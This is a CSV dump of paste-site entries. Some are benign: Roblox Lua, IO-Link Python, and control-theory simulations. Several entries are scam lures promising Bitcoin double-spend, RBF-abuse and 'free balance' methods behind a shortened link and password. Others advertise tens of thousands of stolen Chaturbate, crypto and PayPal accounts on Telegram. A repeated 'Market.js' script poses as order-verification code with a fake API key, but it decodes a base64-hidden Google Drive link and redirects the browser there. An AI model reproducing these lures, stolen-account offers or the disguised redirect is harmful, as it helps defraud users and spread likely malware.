id,title,username,language,date,content
vxgn9hL6,Doublespending using Vanity Wallet,luqlegal,JavaScript,Monday 5th of May 2025 05:05:38 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 70918
Be4ViSFH,Market.js,navrajkhunger,JavaScript,Monday 5th of May 2025 05:05:21 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91627/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
aXSHeCfa,Moving Platforms,OEAgamer1,Lua,Monday 5th of May 2025 04:57:10 AM CDT,"-- ___  ___  ___                              _ 
--| . || __>| . | ___  ___ ._ _ _  ___  _ _ / |
--| | || _> |   |/ . |<_> || ' ' |/ ._>| '_>| |
--`___'|___>|_|_|\_. |<___||_|_|_|\___.|_|  |_|
--			   	 <___'                         
-- -> YT: OEAgamer1

local travelInterval = 4
local velocityCap = 30
local angularVelocityCap = 3
local shouldRemoveTargets = true

local container = script.Parent
local mover = container:FindFirstChild(""Platform"")
local positionController = mover:FindFirstChild(""AlignPosition"")
local orientationController = mover:FindFirstChild(""AlignOrientation"")

local pathPoints = {}

repeat
	local nextTarget = nil
	local smallestIndex = math.huge

	for _, element in ipairs(container:GetChildren()) do
		if element:IsA(""BasePart"") then
			local parts = string.split(element.Name, "" "")
			local prefix, number = parts[1], tonumber(parts[2])
			if string.lower(prefix) == ""destination"" and number and number < smallestIndex then
				smallestIndex = number
				nextTarget = element
			end
		end
	end

	if nextTarget then
		table.insert(pathPoints, nextTarget.CFrame)
		if shouldRemoveTargets then
			nextTarget:Destroy()
		else
			nextTarget.Name = ""Target""
		end
	end
until not nextTarget

positionController.MaxVelocity = velocityCap
orientationController.MaxAngularVelocity = angularVelocityCap
positionController.Position = pathPoints[1].Position
orientationController.CFrame = pathPoints[1].Rotation
mover.Anchored = false

while true do
	for i = 1, #pathPoints do
		local frame = pathPoints[i]
		positionController.Position = frame.Position
		orientationController.CFrame = frame.Rotation
		task.wait(travelInterval)
	end
end
"
3yrjjz60,Chaturbate with Tokens,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:50:17 AM CDT,49265 Accounts Posted On https://t.me/leakzbyeminem
bzhxvqBh,Abuse RBF in BTC transactions,luqlegal,JavaScript,Monday 5th of May 2025 04:50:16 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 55944
U2tqEuvb,Untitled,navrajkhunger,JavaScript,Monday 5th of May 2025 04:50:00 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31621/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
HYuLDf5u,IO-Link AL1900 + Patlite,DeaD_EyE,Python,Monday 5th of May 2025 04:45:34 AM CDT,"import time
from enum import IntEnum
from itertools import islice


# https://git.fh-aachen.de/io-link/iolink-ifm-master-python
from IOT_Master import IOT_Master as Master


MASTER_IP = ""10.215.200.95""


class Color(IntEnum):
    off = 0
    red = 1
    green = 2
    yellow = 3
    blue = 4
    purple = 5
    cyan = 6
    white = 7


class Mode(IntEnum):
    normal = 0
    blink_500ms = 1
    blink_250ms = 2
    blink_125ms = 3
    flash_single = 4
    flash_double = 5
    flash_triple = 6
    sine_slow = 7
    sine_fast = 8

class Buzzer(IntEnum):
    silent = 0
    continuous = 1
    call_sign = 2
    rapid_hi_lo = 3
    sweep = 4
    cont_beep_500ms = 5
    rapid_beep = 6
    rapid_hi_lo_500ms = 7
    sweep_500ms = 8


def signal_light(master: Master, channel: int, color: Color, mode: Mode):
    """"""
    Signal light: https://www.patlite.eu/product/detail0000000710.html
    IOT-Master: https://www.ifm.com/de/de/product/AL1900
    """"""
    master.setPDout(channel, (color | mode << 4).to_bytes(2, ""big""))


def main():
    iot = Master(MASTER_IP)
    # signal_light(iot, 1, Color.green, Mode.blink_500ms)

    for mode in Mode:
        for color in islice(Color, 1, None):
            signal_light(iot, 1, color, mode)
            print(f""{color=!r} | {mode=!r}"")
            time.sleep(5)
    

if __name__ == ""__main__"":
    main()
"
6n64cCCW,Untitled,shmile03,Python,Monday 5th of May 2025 04:42:16 AM CDT,"Ad = np.array([[ 1.00000000e+00,  2.68170103e-02,  9.08934014e-02,
        -6.77884181e-04],
       [ 0.00000000e+00,  1.11897831e+00, -1.74689726e-03,
         9.69312804e-02],
       [ 0.00000000e+00,  5.17634358e-01,  8.23599851e-01,
        -3.86676206e-03],
       [ 0.00000000e+00,  2.36782487e+00, -3.37194203e-02,
         9.78620935e-01]])
Bd = np.array([[0.02927989],
       [0.00561669],
       [0.56716864],
       [0.108416  ]])

def obs_d_sys_creator(A, B, C, mu_ctrl = None, mu_obs = None, D = None):
    theta = control.place(A, B, mu_ctrl) *(-1) if (not mu_ctrl is None) else np.matrix(np.zeros(A.shape[1]))
    L = control.place(A.T, C.T, mu_obs).T  if (not mu_obs is None) else np.matrix(np.zeros(A.shape[1])).T

    my_min = lambda x,y: (min(x[0],y[0]),min(x[1],y[1]))

    if D is None:
        D = np.zeros(A.shape[0])
    sys_matrix = np.block([
        [A, B@theta],
        [L@C,B@theta+ A - L@C]
    ])
    def rhs(X):
        X = np.matrix(X)
        return (sys_matrix@X.T).T
    return rhs

Cd = np.matrix([
    [1,0,0,0],
    [0,1,0,0]
])

eigs = np.linalg.eigvals(Ad)
display(eigs)
mu_ctrl = copy(eigs.tolist())
mu_obs = copy(mu_ctrl)

#case 1:(a)
mu_obs[0] = -0.1
mu_obs[1] = -0.2
#case 2:(b)
mu_obs[0] = 0.8 +0.3j
mu_obs[1] = 0.8 - 0.3j
#case 3:(c)
mu_obs[0] = -0.1
mu_obs[1] = 1

mu_ctrl[0] =  0.8 + 0.3j
mu_ctrl[1] =  0.8 - 0.3j

obs_dis_sys = obs_d_sys_creator(Ad,Bd,Cd, mu_ctrl = mu_ctrl, mu_obs = mu_obs)

L_coefs = control.place(Ad.T, Cd.T, mu_obs).T
control_coefs = -control.place(Ad,Bd, mu_ctrl)
control_coefs

discret_t_arr = np.arange(0,4+0.1,h)
discret_y0 = (0,np.pi/20,0,0,0,0,0,0)

discret_y = [discret_y0]
for i in range(1,len(discret_t_arr)):
    cur_x = obs_dis_sys(discret_y[-1])
    discret_y.append(cur_x.tolist()[0])
discret_y = np.matrix(discret_y).T
#display(discret_y.shape)
u_arr = np.block([(control_coefs@x[0,4:8].T)[0,0] for x in discret_y.T][:-1])
u_arr

def to_plot_arr(arr_1, arr_2):
    plot_arr_1 = np.block([
        np.matrix(arr_1).T[:-1], np.matrix(arr_1).T[1:]
    ])

    plot_arr_2 = np.block([
        np.matrix(arr_2).T,np.matrix(arr_2).T
    ])
    return plot_arr_1.ravel().tolist()[0], plot_arr_2.ravel().tolist()[0]

#используя полученные коэффициенты управления построим непрерывную линейную систему
def discret_controled_system(A,B,u):
    def rhs(t,X):
        X = np.matrix(X)
        return (A@X.T+B*u).T
    return rhs

lin_sol_arr = []
cur_start_pos = discret_y0[:4]

cur_t_limits = [0,0]

for t,u in zip(discret_t_arr[1:],u_arr):
    discret_controled_lin_sys = discret_controled_system(nA,nB,u)
    cur_t_limits[0] = cur_t_limits[1]
    cur_t_limits[1] = t
    cur_sol = solve_ivp(discret_controled_lin_sys,y0 = cur_start_pos, t_span = cur_t_limits, t_eval = np.linspace(*cur_t_limits,10), rtol = 1e-12)
    cur_start_pos = cur_sol.y[:,-1]
    lin_sol_arr.append(cur_sol)

lin_t_arr = np.block([x.t for x in lin_sol_arr])
lin_y_arr = np.block([x.y for x in lin_sol_arr])

from tqdm import tqdm
#символьное вычисление функций
#theta_ddot_func, phi_ddot_func = non_lin_theta_phi_funcs(lhs_1, lhs_2)
#определение н.у.
cur_start_pos = discret_y0[:4]
cur_t_limits = [0,0]

non_lin_sol_arr = []
for t,u in tqdm(zip(discret_t_arr[1:],u_arr)):
    #расчёт системы для текущих н.у.
    controled_theta_ddot_func = theta_ddot_func.subs(parameters).subs({V:u})
    controled_phi_ddot_func = phi_ddot_func.subs(parameters).subs({V:u})
    theta_ddot_lamb, phi_ddot_lamb = non_lin_sys_lambdify(controled_theta_ddot_func, controled_phi_ddot_func)
    non_lin_sys = non_lin_sys_creator(theta_ddot_lamb, phi_ddot_lamb)

    cur_t_limits[0] = cur_t_limits[1]
    cur_t_limits[1] = t
    #численное решение
    non_lin_sol = solve_ivp(fun = non_lin_sys,y0 = cur_start_pos,t_span = cur_t_limits, t_eval = np.linspace(*cur_t_limits,10), rtol = 1e-12)
    cur_start_pos = non_lin_sol.y[:,-1]

    non_lin_sol_arr.append(non_lin_sol)

non_lin_t_arr = np.block([x.t for x in non_lin_sol_arr])
non_lin_y_arr = np.block([x.y for x in non_lin_sol_arr])

fig, ax = plt.subplots(5,2,figsize = (20,10))
ylabel_params = [r'\theta',r'\varphi',r'\dot{\theta}',r'\dot{\varphi}','V']
for i in range(len(ylabel_params)):
    ax[i,0].set_ylabel(f""${ylabel_params[i]}$"")
    ax[i,1].set_ylabel(f""${ylabel_params[i]}$"")


for i,y in enumerate(non_lin_y_arr):
    ax[i,0].plot(non_lin_t_arr,y, color = 'green', label = 'состояние нелин.')
for i in range(4):
    cur_y = discret_y[4+i,:-1]
    x,y = to_plot_arr(discret_t_arr,cur_y)
    ax[i,0].plot(x,y, color = 'orange',linestyle='--', label = 'состояние наблюдателя.')
for i in range(4):
    cur_y = discret_y[i,:-1]
    x,y = to_plot_arr(discret_t_arr,cur_y)
    ax[i,0].plot(x,y, color = 'pink',linestyle='--', label = 'состояние дискр. сис')
for i in range(4):
    cur_y1 = discret_y[i,:-1]
    cur_y2 = discret_y[i+4,:-1]
    x,y = to_plot_arr(discret_t_arr,abs(cur_y2-cur_y1))
    ax[i,1].plot(x,y, color = 'pink',linestyle='--', label = 'невязка наблюдателя')


for i,y in enumerate(lin_y_arr):
    ax[i,0].plot(lin_t_arr,y, color = 'red', label = 'состояние лин.')

ax[4,0].plot(*to_plot_arr(discret_t_arr,u_arr))
ax[0,0].legend()"
KrQWiJQ2,Crypto Accounts,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:34:55 AM CDT,81543 Accounts Posted On https://t.me/leakzbyeminem
a4drhyzz,Stake Free Balance Method,luqlegal,JavaScript,Monday 5th of May 2025 04:34:55 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 41720
MKYghxr5,Market.js,luqlegal,JavaScript,Monday 5th of May 2025 04:34:36 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98059/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KZiZYqSm,PayPal with Balance,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:19:34 AM CDT,19153 Accounts Posted On https://t.me/leakzbyeminem
fx6U9Lfa,Abuse RBF in BTC transactions,iLoveToWatch,JavaScript,Monday 5th of May 2025 04:19:29 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 49108
aSvGd63e,Untitled,luqlegal,JavaScript,Monday 5th of May 2025 04:19:14 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/80857/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
beWmtNPa,Untitled,shmile03,Python,Monday 5th of May 2025 04:08:44 AM CDT,"import numpy as np
import control
import matplotlib.pyplot as plt

# 1) Задаём параметры
A = np.array([[0,      0,       1,      0],
              [0,      0,       0,      1],
              [0, 5.8773, -1.9436, -0.3484],
              [0, 24.5313, -0.3823, -1.4543]])
B = np.array([[0],
              [0],
              [6.2491],
              [1.2311]])
Q = np.diag([100, 0, 0, 0])
R = np.array([[1]])

# 2) Решаем LQR — получаем K, решение Риккати X и собственные числа E
K, X, E = control.lqr(A, B, Q, R)

# 5) Начальные условия и временная сетка
x0 = [0, np.pi/17, 0, 0]
t = np.linspace(0, 10, 1001)

#
control_coefs = -K

theta_ddot_func, phi_ddot_func = non_lin_theta_phi_funcs(lhs_1, lhs_2)
theta_ddot_func = theta_ddot_func.subs(parameters)
phi_ddot_func = phi_ddot_func.subs(parameters)

controled_theta_ddot_func = add_control(theta_ddot_func,control_coefs)
controled_phi_ddot_func = add_control(phi_ddot_func,control_coefs)

theta_ddot_lamb = sp.lambdify(vars_vector, controled_theta_ddot_func)
phi_ddot_lamb = sp.lambdify(vars_vector, controled_phi_ddot_func)

non_lin_sys = non_lin_sys_creator(theta_ddot_lamb, phi_ddot_lamb)

non_lin_sol = solve_ivp(fun = non_lin_sys,y0 = x0[:4],t_span = (t[0],t[-1]), t_eval = t, rtol = 1e-2)
#


# 3) Замкнутая матрица системы
A_cl = A - B @ K

# 4) Формируем модель состояния-выхода для замкнутой системы
#    Здесь C=I, D=0 чтобы на выходе видеть сами состояния
C = np.eye(4)
D = np.zeros((4, 1))
sys_cl = control.ss(A_cl, B, C, D)

# 6) Моделируем свободную (нулевой вход) динамику системы от x0
t_out, y_out = control.initial_response(sys_cl, T=t, X0=x0)

# 7) Рисуем 4 графика переменных состояния
labels = [r'$\theta$', r'$\varphi$', r'$\dot{\theta}$', r'$\dot{\varphi}$']
fig, axes = plt.subplots(4, 1, figsize=(8, 10), sharex=True)

for i in range(4):
    axes[i].plot(t_out, y_out[i, :], 'b', label=""линейная"")
    axes[i].plot(non_lin_sol[""t""], non_lin_sol[""y""][i], 'r', label=""нелинейная"")
    axes[i].set_ylabel(labels[i], fontweight='bold')
    axes[i].legend()
    axes[i].set_xlabel('t')

#plt.tight_layout()
plt.show()"
